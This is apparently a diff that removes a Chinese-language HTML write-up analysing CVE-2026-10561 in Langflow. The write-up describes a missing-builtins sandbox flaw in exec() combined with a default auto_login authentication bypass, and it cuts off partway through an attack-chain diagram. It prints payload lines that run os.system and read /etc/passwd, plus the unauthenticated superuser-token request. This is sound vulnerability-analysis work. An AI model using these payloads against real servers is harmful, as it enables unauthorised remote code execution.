-        &lt;span class="n"&gt;globals_&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;module_name&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;__import__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;module_name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="c1"&gt;# 关键缺陷：从未设置 globals_[&amp;quot;builtins&amp;quot;] = {}&lt;/span&gt;
-    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;globals_&lt;/span&gt;
-
-&lt;span class="c1"&gt;# CPython exec() 行为：globals 中没有 &amp;quot;builtins&amp;quot; 键时，&lt;/span&gt;
-&lt;span class="c1"&gt;# 会自动插入完整的 builtins 模块&lt;/span&gt;
-&lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;get_globals&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
-&lt;span class="c1"&gt;# → import, open, eval, __import__ 全部可达&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h3&gt;3.2 逐行剖析&lt;/h3&gt;
-&lt;p&gt;&lt;code&gt;get_globals()&lt;/code&gt; 方法创建空字典 &lt;code&gt;globals_&lt;/code&gt;，遍历 &lt;code&gt;self.global_imports&lt;/code&gt; 白名单（默认 &lt;code&gt;["math"]&lt;/code&gt;）把每个模块塞进去，然后返回。关键在于：返回的字典里&lt;strong&gt;没有 &lt;code&gt;"builtins"&lt;/code&gt; 这个键&lt;/strong&gt;。这看起来无伤大雅——"我只是没放 builtins 而已"，但问题恰恰出在这里。&lt;/p&gt;
-&lt;h3&gt;3.3 CPython &lt;code&gt;exec()&lt;/code&gt; 的隐藏行为&lt;/h3&gt;
-&lt;p&gt;CPython 的 &lt;code&gt;exec(source, globals)&lt;/code&gt; 在执行前会检查传入的 &lt;code&gt;globals&lt;/code&gt; 字典中是否存在 &lt;code&gt;"builtins"&lt;/code&gt; 键（定义在 &lt;code&gt;Python/bltinmodule.c&lt;/code&gt; / &lt;code&gt;Python/ceval.c&lt;/code&gt;）：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;builtins&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;globals&lt;/span&gt;:
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nv"&gt;globals&lt;/span&gt;[&lt;span class="s2"&gt;&amp;quot;builtins&amp;quot;&lt;/span&gt;]&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;完整的&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;builtins&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;模块&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;也就是说：&lt;strong&gt;如果你显式设置 &lt;code&gt;globals["builtins"] = {}&lt;/code&gt;，用户代码就没有任何内置函数可用；但如果你根本不设置这个键，CPython 会"贴心地"帮你补上完整的 builtins 模块。&lt;/strong&gt; 这是一个"不作为即默许"的经典案例。&lt;/p&gt;
-&lt;h3&gt;3.4 后果：白名单形同虚设&lt;/h3&gt;
-&lt;p&gt;一旦完整的 builtins 模块被自动注入，以下内置函数无论白名单如何都变得可达：&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;内置函数&lt;/th&gt;
-&lt;th&gt;用途&lt;/th&gt;
-&lt;th&gt;危害&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;__import__&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;动态导入任意模块&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;__import__('os')&lt;/code&gt; 直接拿到 os&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;import&lt;/code&gt; 语句&lt;/td&gt;
-&lt;td&gt;模块导入&lt;/td&gt;
-&lt;td&gt;&lt;code&gt;import os; os.system(...)&lt;/code&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;open&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;文件读写&lt;/td&gt;
-&lt;td&gt;读取 &lt;code&gt;/etc/passwd&lt;/code&gt;、写入 webshell&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;eval&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;表达式求值&lt;/td&gt;
-&lt;td&gt;二次逃逸沙箱&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;exec&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;嵌套执行&lt;/td&gt;
-&lt;td&gt;绕过任何外层限制&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;code&gt;getattr&lt;/code&gt; / &lt;code&gt;setattr&lt;/code&gt;&lt;/td&gt;
-&lt;td&gt;属性访问&lt;/td&gt;
-&lt;td&gt;反射逃逸&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;因此，所谓的 &lt;code&gt;global_imports&lt;/code&gt; 白名单——无论你配置成 &lt;code&gt;["math"]&lt;/code&gt; 还是 &lt;code&gt;["math", "json"]&lt;/code&gt;——在 &lt;code&gt;exec()&lt;/code&gt; 的自动注入面前都是一张废纸。攻击者只需一行：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;__import__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;os&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;就能在宿主机上以 Langflow 进程的权限执行任意系统命令。&lt;/p&gt;
-&lt;h3&gt;3.5 ASCII 流程图：builtins 注入全链路&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;┌─────────────────────────────────────────────────────────────────┐&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;                    &lt;/span&gt;&lt;span class="n"&gt;PythonREPLComponent&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;执行链路&lt;/span&gt;&lt;span class="w"&gt;                   &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;└─────────────────────────────────────────────────────────────────┘&lt;/span&gt;
-&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;用户提交的&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Python&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;代码&lt;/span&gt;
-&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="err"&gt;▼&lt;/span&gt;
-&lt;span class="err"&gt;┌───────────────────────┐&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;get_globals&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;globals_&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;{}&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;&amp;quot;math&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;globals_&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;未设置&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;builtins&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;键&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;│◄──&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;缺陷所在&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;globals_&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;└───────────┬───────────┘&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="err"&gt;▼&lt;/span&gt;
-&lt;span class="err"&gt;┌───────────────────────────────────────────────────┐&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_code&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;globals_&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;                         &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;                                                    &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;CPython&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;内部检查&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;                                  &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;builtins&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;in&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;globals_&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;                  &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;globals_&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;&amp;quot;builtins&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;完整&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;builtins&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;模块&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="err"&gt;│◄──&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;自动注入&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;                                                    &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;现在&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;globals_&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;包含&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;                                &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;math&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="err"&gt;→&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;math&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;模块&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;白名单&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;                  &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="ss"&gt;&amp;quot;builtins&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;→&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;完整&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;builtins&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;自动注入&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;└───────────┬───────────────────────────────────────┘&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="err"&gt;▼&lt;/span&gt;
-&lt;span class="err"&gt;┌───────────────────────────────────────────────────┐&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;用户代码执行环境&lt;/span&gt;&lt;span class="w"&gt;                                    &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;                                                    &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;__import__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;os&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="k"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;...&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="err"&gt;←&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;可达&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/etc/passwd&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="k"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="err"&gt;←&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;可达&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(...)&lt;/span&gt;&lt;span class="w"&gt;                         &lt;/span&gt;&lt;span class="err"&gt;←&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;可达&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;│&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;import&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="w"&gt;                 &lt;/span&gt;&lt;span class="err"&gt;←&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;可达&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="err"&gt;└───────────────────────────────────────────────────┘&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="err"&gt;│&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="err"&gt;▼&lt;/span&gt;
-&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;宿主机&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;RCE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;以&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Langflow&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;进程权限运行&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-&lt;h2&gt;四、认证绕过：auto_login 默认开启&lt;/h2&gt;
-&lt;p&gt;builtins 注入是"枪"，认证绕过则是"把枪递给了一个不需要任何身份的人"。&lt;/p&gt;
-&lt;h3&gt;4.1 LANGFLOW_AUTO_LOGIN=true&lt;/h3&gt;
-&lt;p&gt;Langflow 有一个配置项 &lt;code&gt;LANGFLOW_AUTO_LOGIN&lt;/code&gt;，默认值为 &lt;code&gt;true&lt;/code&gt;。当这个选项开启时，存在一个端点：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /api/v1/auto_login
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;这个端点&lt;strong&gt;不需要任何凭据&lt;/strong&gt;，请求即可签发一个&lt;strong&gt;超级用户（superuser）&lt;/strong&gt;的 JWT。拿到这个 JWT 之后，攻击者就拥有了 Langflow 的全部管理员权限，包括访问 &lt;code&gt;PythonREPLComponent&lt;/code&gt; 相关的接口。&lt;/p&gt;
-&lt;h3&gt;4.2 为什么这是默认配置&lt;/h3&gt;
-&lt;p&gt;Langflow 大量被用于本地开发、原型验证、教学演示等场景，用户不想配置账号密码，只想打开浏览器就开始拖拽画布，于是 &lt;code&gt;auto_login=true&lt;/code&gt; 成了默认值。但只要实例暴露在网络上（误配置、内网横向可达、公网部署），任何能访问端口的人都能一键拿到超级管理员权限。&lt;/p&gt;
-&lt;h3&gt;4.3 认证绕过流程&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;攻击者 (匿名, 无凭据)
-    │  GET /api/v1/auto_login (无认证头)
-    ▼
-Langflow 后端: LANGFLOW_AUTO_LOGIN == true ?
-    │ yes → 签发 superuser JWT (无需密码)
-    ▼
-超级用户 JWT → 可访问所有 API → 可调用 PythonREPLComponent
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;hr /&gt;
-&lt;h2&gt;五、两个独立失败的叠加：为什么是 CVSS 10.0&lt;/h2&gt;
-&lt;p&gt;这是理解这个漏洞"满分"属性的关键。CVE-2026-10561 不是单一缺陷，而是&lt;strong&gt;两个独立失败的叠加&lt;/strong&gt;。&lt;/p&gt;
-&lt;h3&gt;5.1 失败 #1：Python 执行隔离失败&lt;/h3&gt;
-&lt;p&gt;&lt;code&gt;PythonREPLComponent&lt;/code&gt; 的代码执行节点&lt;strong&gt;没有任何隔离机制&lt;/strong&gt;：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;没有命名空间隔离（与宿主进程共享同一个 Python 解释器实例）&lt;/li&gt;
-&lt;li&gt;没有 &lt;code&gt;seccomp&lt;/code&gt; 限制系统调用&lt;/li&gt;
-&lt;li&gt;没有降权（以 Langflow 服务进程的权限运行，通常是高权限）&lt;/li&gt;
-&lt;li&gt;没有 builtins 清空（即本漏洞的核心）&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;代码执行节点与 Langflow 服务跑在&lt;strong&gt;同一个执行环境&lt;/strong&gt;中。这意味着：用户代码能做的事 = Langflow 进程能做的事。&lt;/p&gt;
-&lt;h3&gt;5.2 失败 #2：认证绕过&lt;/h3&gt;
-&lt;p&gt;&lt;code&gt;auto_login=true&lt;/code&gt; 默认开启，&lt;code&gt;/api/v1/auto_login&lt;/code&gt; 无凭据签发超级用户 JWT。&lt;/p&gt;
-&lt;h3&gt;5.3 叠加效应&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;单独评估：
-┌────────────────────────────────────────────────────────────┐
-│  失败#1 单独 (隔离失败 + 认证完好)                          │
-│  → 需要登录才能利用，但登录后可 RCE                          │
-│  → CVSS ≈ 8.x (PR:L 或 PR:H 拉低分数)                      │
-├────────────────────────────────────────────────────────────┤
-│  失败#2 单独 (认证绕过 + 隔离完好)                          │
-│  → 可拿到管理员，但管理员没有直接 RCE 的入口                  │
-│  → CVSS ≈ 6-7 (主要是权限提升/信息泄露)                     │
-├────────────────────────────────────────────────────────────┤
-│  两者叠加 (认证绕过 + 隔离失败)                              │
-│  → 未授权用户 → 超级管理员 → 无隔离 Python 执行 → RCE       │
-│  → CVSS = 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)      │
-└────────────────────────────────────────────────────────────┘
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;用 CVSS 3.1 的维度来拆解这个 10.0：&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;维度&lt;/th&gt;
-&lt;th&gt;值&lt;/th&gt;
-&lt;th&gt;含义&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;AV (Attack Vector)&lt;/td&gt;
-&lt;td&gt;N (Network)&lt;/td&gt;
-&lt;td&gt;通过网络即可利用&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;AC (Attack Complexity)&lt;/td&gt;
-&lt;td&gt;L (Low)&lt;/td&gt;
-&lt;td&gt;无需特殊条件&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;PR (Privileges Required)&lt;/td&gt;
-&lt;td&gt;N (None)&lt;/td&gt;
-&lt;td&gt;&lt;strong&gt;无需任何认证&lt;/strong&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;UI (User Interaction)&lt;/td&gt;
-&lt;td&gt;N (None)&lt;/td&gt;
-&lt;td&gt;无需用户交互&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;S (Scope)&lt;/td&gt;
-&lt;td&gt;C (Changed)&lt;/td&gt;
-&lt;td&gt;影响波及组件之外的系统&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;C (Confidentiality)&lt;/td&gt;
-&lt;td&gt;H (High)&lt;/td&gt;
-&lt;td&gt;完全读取宿主机数据&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;I (Integrity)&lt;/td&gt;
-&lt;td&gt;H (High)&lt;/td&gt;
-&lt;td&gt;完全篡改宿主机&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;A (Availability)&lt;/td&gt;
-&lt;td&gt;H (High)&lt;/td&gt;
-&lt;td&gt;可致服务完全不可用&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;每一个维度都取到了最严重的值，这就是 10.0 满分的由来。关键是 &lt;code&gt;PR:N&lt;/code&gt;——如果没有认证绕过，&lt;code&gt;PR&lt;/code&gt; 至少是 &lt;code&gt;L&lt;/code&gt;，分数会掉到 9.x 以下；如果没有隔离失败，&lt;code&gt;C/I/A&lt;/code&gt; 不可能同时是 &lt;code&gt;H&lt;/code&gt;，&lt;code&gt;S&lt;/code&gt; 也不可能是 &lt;code&gt;C&lt;/code&gt;。两者缺一不可。&lt;/p&gt;
-&lt;hr /&gt;
-&lt;h2&gt;六、完整利用路径&lt;/h2&gt;
-&lt;p&gt;将上面两个缺陷串联，完整攻击链路如下：&lt;/p&gt;
-&lt;h3&gt;6.1 攻击链 ASCII 图&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;┌─────────────────────────────────────────────────────────────────────┐
-│                     CVE-2026-10561 完整攻击链                        │
-└─────────────────────────────────────────────────────────────────────┘
-
-  [Step 1] 认证绕过
-  ────────────────────────────────────────
-  攻击者 ──GET /api/v1/auto_login──► Langflow
-                                        │
-                                        ▼
-                                   签发 superuser JWT
-                                        │
-  [Step 2] 携带 JWT 访问 Python 执行接口  │
-  ────────────────────────────────────────
-  攻击者 ──POST /api/v1/... ────────► Langflow
-            Authorization: Bearer &amp;lt;JWT&amp;gt;     │
-            body: {&amp;quot;code&amp;quot;: &amp;quot;...&amp;quot;}            │
-                                             ▼
-                                   PythonREPLComponent
-                                   get_globals()
-                                             │
-  [Step 3] builtins 自动注入                 │
